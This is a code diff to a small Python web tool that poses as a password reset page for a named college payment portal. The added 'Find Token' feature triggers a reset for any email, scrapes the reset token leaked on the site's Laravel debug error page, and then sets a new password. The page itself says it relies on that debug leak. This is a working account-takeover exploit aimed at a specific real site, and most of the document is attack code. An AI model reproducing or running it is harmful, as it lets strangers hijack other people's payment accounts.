@@ -1,5 +1,6 @@
 from http.server import BaseHTTPRequestHandler
 import json
+import re
 import requests
 from urllib.parse import parse_qs
 
@@ -11,115 +12,292 @@ HTML = """<!DOCTYPE html>
   <title>Password Reset • Vanraj College</title>
   <style>
     :root {
-      --primary: #2563eb;
-      --primary-hover: #1d4ed8;
-      --bg: #f1f5f9;
-      --card: #ffffff;
-      --text: #0f172a;
-      --muted: #64748b;
-      --border: #e2e8f0;
-      --radius: 12px;
+      --primary: #2563eb; --primary-hover: #1d4ed8; --bg: #f1f5f9; --card: #fff;
+      --text: #0f172a; --muted: #64748b; --border: #e2e8f0; --radius: 12px;
     }
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
-      font-family: system-ui, -apple-system, sans-serif;
-      background: var(--bg);
-      min-height: 100vh;
-      display: grid;
-      place-items: center;
-      padding: 1.25rem;
-      color: var(--text);
+      font-family: system-ui, -apple-system, sans-serif; background: var(--bg);
+      min-height: 100vh; display: grid; place-items: center; padding: 1.25rem; color: var(--text);
     }
     .card {
-      background: var(--card);
-      width: 100%;
-      max-width: 420px;
-      padding: 2rem;
-      border-radius: 16px;
-      box-shadow: 0 8px 30px rgba(0,0,0,.08);
+      background: var(--card); width: 100%; max-width: 440px; padding: 2rem;
+      border-radius: 16px; box-shadow: 0 8px 30px rgba(0,0,0,.08);
     }
     h1 { font-size: 1.35rem; font-weight: 700; margin-bottom: .25rem; }
-    .sub { color: var(--muted); font-size: .875rem; margin-bottom: 1.75rem; }
+    .sub { color: var(--muted); font-size: .875rem; margin-bottom: 1.5rem; }
     label { display: block; font-size: .8125rem; font-weight: 500; margin: 1rem 0 .4rem; }
     input {
       width: 100%; padding: .7rem .9rem; border: 1px solid var(--border);
       border-radius: var(--radius); font-size: .95rem;
-      transition: border-color .15s, box-shadow .15s;
     }
     input:focus {
       outline: none; border-color: var(--primary);
       box-shadow: 0 0 0 3px rgba(37,99,235,.15);
     }
+    .row { display: flex; gap: .5rem; margin-top: .5rem; }
+    .row input { flex: 1; }
     button {
-      width: 100%; margin-top: 1.75rem; padding: .8rem;
-      background: var(--primary); color: #fff; border: none;
-      border-radius: var(--radius); font-size: 1rem; font-weight: 600; cursor: pointer;
+      padding: .75rem 1rem; background: var(--primary); color: #fff; border: none;
+      border-radius: var(--radius); font-size: .9rem; font-weight: 600; cursor: pointer;
+      white-space: nowrap;
     }
     button:hover { background: var(--primary-hover); }
     button:disabled { opacity: .65; cursor: not-allowed; }
+    button.secondary { background: #475569; }
+    button.secondary:hover { background: #334155; }
+    button.full { width: 100%; margin-top: 1.5rem; padding: .85rem; font-size: 1rem; }
     #result {
       display: none; margin-top: 1.25rem; padding: .85rem 1rem;
-      border-radius: var(--radius); font-size: .875rem; line-height: 1.45;
+      border-radius: var(--radius); font-size: .875rem; line-height: 1.45; word-break: break-all;
     }
     .ok  { background: #dcfce7; color: #166534; border: 1px solid #bbf7d0; }
     .err { background: #fee2e2; color: #991b1b; border: 1px solid #fecaca; }
     .note {
-      margin-top: 1.5rem; padding: .85rem; background: #f8fafc;
+      margin-top: 1.25rem; padding: .85rem; background: #f8fafc;
       border-radius: 10px; font-size: .78rem; color: var(--muted); line-height: 1.5;
     }
-    code { background: #e2e8f0; padding: .1rem .35rem; border-radius: 4px; font-size: .75rem; }
   </style>
 </head>
 <body>
   <div class="card">
     <h1>Password Reset</h1>
     <p class="sub">Vanraj College Payment Portal</p>
+
     <label for="email">Email Address</label>
     <input id="email" type="email" placeholder="registered@email.com" autocomplete="email" required>
+
     <label for="token">Reset Token</label>
-    <input id="token" type="text" placeholder="Email link se token" required>
+    <div class="row">
+      <input id="token" type="text" placeholder="Auto-fill ya paste karo">
+      <button type="button" class="secondary" id="findBtn" onclick="findToken()">Find Token</button>
+    </div>
+
     <label for="password">New Password</label>
     <input id="password" type="password" placeholder="Naya password (min 6)" autocomplete="new-password" required>
-    <button id="btn" onclick="resetPassword()">Reset Password</button>
+
+    <button class="full" id="btn" onclick="resetPassword()">Reset Password</button>
+
     <div id="result"></div>
+
     <div class="note">
-      Token email ke reset link se aata hai:<br>
-      <code>/password/reset/<b>yahan-wala-token</b></code>
+      <b>Find Token:</b> Email dalo → Find Token dabao → token auto-fill ho jayega.<br>
+      Yeh site ke debug leak pe depend karta hai. Mail system theek ho jaye to band ho sakta hai.
     </div>
   </div>
   <script>
     const $ = id => document.getElementById(id);
+
+    function show(el, msg, ok) {
+      el.style.display = 'block';
+      el.className = ok ? 'ok' : 'err';
+      el.textContent = msg;
+    }
+
+    async function findToken() {
+      const email = $('email').value.trim();
+      const btn = $('findBtn');
+      const result = $('result');
+      if (!email) return show(result, 'Pehle email dalo', false);
+
+      btn.disabled = true;
+      btn.textContent = 'Finding...';
+      result.style.display = 'none';
+
+      try {
+        const res = await fetch(window.location.pathname || '/', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ action: 'find_token', email })
+        });
+        const data = await res.json();
+        if (data.success && data.token) {
+          $('token').value = data.token;
+          show(result, '✅ Token mil gaya! Ab naya password dalo aur Reset dabao.\n\n' + data.token, true);
+        } else {
+          show(result, data.message || 'Token nahi mila', false);
+        }
+      } catch (err) {
+        show(result, 'Network error: ' + err.message, false);
+      }
+
+      btn.disabled = false;
+      btn.textContent = 'Find Token';
+    }
+
     async function resetPassword() {
       const email = $('email').value.trim();
       const token = $('token').value.trim();
       const password = $('password').value.trim();
       const btn = $('btn');
       const result = $('result');
+
       if (!email || !token || !password) return show(result, 'Sab fields bharna zaroori hai', false);
       if (password.length < 6) return show(result, 'Password kam se kam 6 characters ka hona chahiye', false);
-      btn.disabled = true; btn.textContent = 'Processing...'; result.style.display = 'none';
+
+      btn.disabled = true;
+      btn.textContent = 'Processing...';
+      result.style.display = 'none';
+
       try {
         const res = await fetch(window.location.pathname || '/', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ email, token, password })
+          body: JSON.stringify({ action: 'reset', email, token, password })
         });
         const data = await res.json();
         show(result, data.message, data.success);
       } catch (err) {
         show(result, 'Network error: ' + err.message, false);
       }
-      btn.disabled = false; btn.textContent = 'Reset Password';
+
+      btn.disabled = false;
+      btn.textContent = 'Reset Password';
     }
-    function show(el, msg, ok) {
-      el.style.display = 'block';
-      el.className = ok ? 'ok' : 'err';
-      el.textContent = msg;
-    }
-    document.addEventListener('keydown', e => { if (e.key === 'Enter') resetPassword(); });
+
+    document.addEventListener('keydown', e => {
+      if (e.key === 'Enter') resetPassword();
+    });
   </script>
 </body>
 </html>"""
+
+
+def find_token(email: str):
+    """Request reset link and extract token from Laravel debug 500 page."""
+    BASE_URL = "https://payment.vaccdharampur.org"
+    session = requests.Session()
+    session.headers.update({
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    })
+
+    r = session.get(f"{BASE_URL}/password/reset", timeout=15)
+    if r.status_code != 200:
+        return {"success": False, "message": f"Reset page open nahi hua ({r.status_code})"}
+
+    m = re.search(r'name="_token"\s+value="([^"]+)"', r.text)
+    if not m:
+        return {"success": False, "message": "CSRF token nahi mila"}
+    csrf = m.group(1)
+
+    post = session.post(
+        f"{BASE_URL}/password/email",
+        data={"_token": csrf, "email": email},
+        headers={"Referer": f"{BASE_URL}/password/reset", "Origin": BASE_URL},
+        timeout=20,
+    )
+
+    tokens = re.findall(r"password/reset/([a-f0-9]{60,})", post.text, re.I)
+    if tokens:
+        token = tokens[0]
+        return {
+            "success": True,
+            "token": token,
+            "message": "Token mil gaya",
+            "reset_url": f"{BASE_URL}/password/reset/{token}",
+        }
+
+    # Fallback messages
+    text_lower = post.text.lower()
+    if post.status_code == 200 and ("e-mailed" in text_lower or "sent" in text_lower):
+        return {
+            "success": False,
+            "message": "Mail bhej di gayi lagti hai, lekin debug page me token leak nahi hua. Inbox check karo.",
+        }
+    if "no valid recipients" in text_lower or "swift_transport" in text_lower:
+        return {
+            "success": False,
+            "message": "SMTP error aaya lekin token leak nahi mila. Thodi der baad try karo.",
+        }
+
+    return {
+        "success": False,
+        "message": f"Token nahi mila (HTTP {post.status_code}). Site debug mode band ho sakta hai.",
+    }
+
+
+def reset_password(email: str, token: str, password: str):
+    BASE_URL = "https://payment.vaccdharampur.org"
+    session = requests.Session()
+    session.headers.update({
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    })
+
+    reset_url = f"{BASE_URL}/password/reset/{token}"
+    resp = session.get(reset_url, timeout=15)
+
+    if resp.status_code != 200:
+        raise Exception(f"Reset page open nahi hua (Status: {resp.status_code}). Token expire/invalid ho sakta hai.")
+
+    csrf_token = None
+    if 'name="_token"' in resp.text:
+        start = resp.text.find('name="_token" value="') + len('name="_token" value="')
+        end = resp.text.find('"', start)
+        csrf_token = resp.text[start:end]
+
+    if not csrf_token:
+        raise Exception("CSRF token nahi mila.")
+
+    payload = {
+        "_token": csrf_token,
+        "token": token,
+        "email": email,
+        "password": password,
+        "password_confirmation": password,
+    }
+
+    headers = {
+        "Referer": reset_url,
+        "Origin": BASE_URL,
+    }
+
+    post_resp = session.post(
+        f"{BASE_URL}/password/reset",
+        data=payload,
+        headers=headers,
+        allow_redirects=True,
+        timeout=15,
+    )
+
+    text_lower = post_resp.text.lower()
+    final_url = post_resp.url.lower().rstrip("/")
+
+    success = (
+        "password has been reset" in text_lower
+        or "your password has been reset" in text_lower
+        or final_url.endswith("/home")
+        or final_url.endswith("/dashboard")
+        or "/home" in final_url
+        or final_url.endswith("/login")
+        or "/login" in final_url
+    )
+
+    if "/password/reset" in final_url and (
+        "invalid" in text_lower or "expired" in text_lower or "can't find" in text_lower
+    ):
+        success = False
+
+    message = (
+        "✅ Password reset successful! Ab naye password se login karo."
+        if success
+        else "❌ Reset fail hua."
+    )
+
+    if not success:
+        if "we can't find a user with that e-mail address" in text_lower:
+            message = "❌ Is email se koi account nahi mila."
+        elif "token" in text_lower and ("invalid" in text_lower or "expired" in text_lower):
+            message = "❌ Reset token invalid ya expire ho gaya hai. Find Token se naya lo."
+        else:
+            message = f"❌ Reset fail hua. Final URL: {post_resp.url}"
+
+    return {
+        "success": success,
+        "message": message,
+        "status_code": post_resp.status_code,
+        "final_url": post_resp.url,
+    }
+
 
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
@@ -138,102 +316,31 @@ class handler(BaseHTTPRequestHandler):
             data = parse_qs(body)
             data = {k: v[0] for k, v in data.items()}
 
+        action = data.get("action", "reset").strip()
         email = data.get("email", "").strip()
-        token = data.get("token", "").strip()
-        password = data.get("password", "").strip()
-
-        if not email or not token or not password:
-            return self._json(400, {
-                "success": False,
-                "message": "Email, Token aur Password sab required hain"
-            })
 
         try:
-            BASE_URL = "https://payment.vaccdharampur.org"
-            session = requests.Session()
+            if action == "find_token":
+                if not email:
+                    return self._json(400, {"success": False, "message": "Email required"})
+                result = find_token(email)
+                return self._json(200, result)
 
-            reset_url = f"{BASE_URL}/password/reset/{token}"
-            resp = session.get(reset_url, timeout=15)
+            # default: reset
+            token = data.get("token", "").strip()
+            password = data.get("password", "").strip()
 
-            if resp.status_code != 200:
-                raise Exception(f"Reset page open nahi hua (Status: {resp.status_code}). Token expire ya invalid ho sakta hai.")
+            if not email or not token or not password:
+                return self._json(400, {
+                    "success": False,
+                    "message": "Email, Token aur Password sab required hain",
+                })
 
-            csrf_token = None
-            if 'name="_token"' in resp.text:
-                start = resp.text.find('name="_token" value="') + len('name="_token" value="')
-                end = resp.text.find('"', start)
-                csrf_token = resp.text[start:end]
-
-            if not csrf_token:
-                raise Exception("CSRF token nahi mila. Page structure change ho sakta hai.")
-
-            payload = {
-                "_token": csrf_token,
-                "token": token,
-                "email": email,
-                "password": password,
-                "password_confirmation": password
-            }
-
-            headers = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "Referer": reset_url,
-                "Origin": BASE_URL
-            }
-
-            post_resp = session.post(
-                f"{BASE_URL}/password/reset",
-                data=payload,
-                headers=headers,
-                allow_redirects=True,
-                timeout=15
-            )
-
-            text_lower = post_resp.text.lower()
-            final_url = post_resp.url.lower().rstrip("/")
-
-            # Laravel success often redirects to /home (logged in), not /login
-            success = (
-                "password has been reset" in text_lower or
-                "your password has been reset" in text_lower or
-                "password reset successfully" in text_lower or
-                final_url.endswith("/home") or
-                final_url.endswith("/dashboard") or
-                "/home" in final_url or
-                final_url.endswith("/login") or
-                "/login" in final_url
-            )
-
-            # If still on reset page with validation errors => fail
-            if "/password/reset" in final_url and (
-                "invalid" in text_lower or "expired" in text_lower or "can't find" in text_lower
-            ):
-                success = False
-
-            message = "✅ Password reset successful! Ab naye password se login karo." if success else "❌ Reset fail hua."
-
-            if not success:
-                if "we can't find a user with that e-mail address" in text_lower:
-                    message = "❌ Is email se koi account nahi mila."
-                elif "token" in text_lower and ("invalid" in text_lower or "expired" in text_lower):
-                    message = "❌ Reset token invalid ya expire ho gaya hai. Naya link mangwao."
-                elif "password" in text_lower and "confirmation" in text_lower:
-                    message = "❌ Password confirmation match nahi kar raha."
-                else:
-                    message = f"❌ Reset fail hua. Final URL: {post_resp.url}"
-
-            return self._json(200, {
-                "success": success,
-                "message": message,
-                "status_code": post_resp.status_code,
-                "final_url": post_resp.url
-            })
+            result = reset_password(email, token, password)
+            return self._json(200, result)
 
         except Exception as e:
-            return self._json(500, {
-                "success": False,
-                "message": f"Error: {str(e)}"
-            })
+            return self._json(500, {"success": False, "message": f"Error: {str(e)}"})
 
     def do_OPTIONS(self):
         self.send_response(200)
